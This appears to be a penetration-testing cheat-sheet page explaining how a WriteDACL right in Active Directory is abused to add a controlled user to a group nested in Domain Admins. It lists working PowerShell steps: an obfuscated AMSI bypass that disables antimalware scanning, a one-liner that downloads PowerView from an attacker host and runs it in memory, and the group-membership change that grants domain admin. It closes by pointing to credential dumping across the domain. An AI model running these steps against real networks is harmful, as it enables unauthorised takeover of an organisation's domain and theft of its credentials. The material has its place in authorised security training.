# WriteDACL Exploitation

![[https://github.com/V0lk3n/OSEP-CheatSheet/blob/main/ActiveDirectoryAndExploit/WriteDACL-Exploitation/bloodhount-writedacl.png]]

We can see that the Domain Group "SQL Admin" have WriteDACL right against "WebAdmins" group. And WebAdmins group is member of Domain Admin, so if we are part of WebAdmins we are DA.

Assuming that we got an user inside the SQL Admin group, we can exploit the WriteDACL right to add an user that we already have access, to the WebAdmins group to become DA.

1. As user of SQL Admin group add an user that we already have access to, to the Web Admins group giving him all rights.

```bash
# As the user of SQL Admin group
C:\>powershell.exe -nop -exec bypass

PS C:\> $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

PS C:\> (new-object system.net.webclient).downloadstring('http://192.168.x.x:8080/PowerView.ps1') | iex

PS C:\> Add-DomainGroupMember -Identity 'WEBADMINS' -Members 'V0lk3n' -Rights all
```

2. Verify that V0lk3n is part of WebAdmins group.

```PowerShell
PS C:\> Get-DomainUser -Identity V0lk3n
Get-DomainUser -Identity will
...
givenname             : V0lk3n
memberof              : CN=WebAdmins,OU=TGroups,DC=sinhack,DC=com
...
```

3. Now as DomainAdmin we can fire up SecretDump or whatever and pwn all the domain.
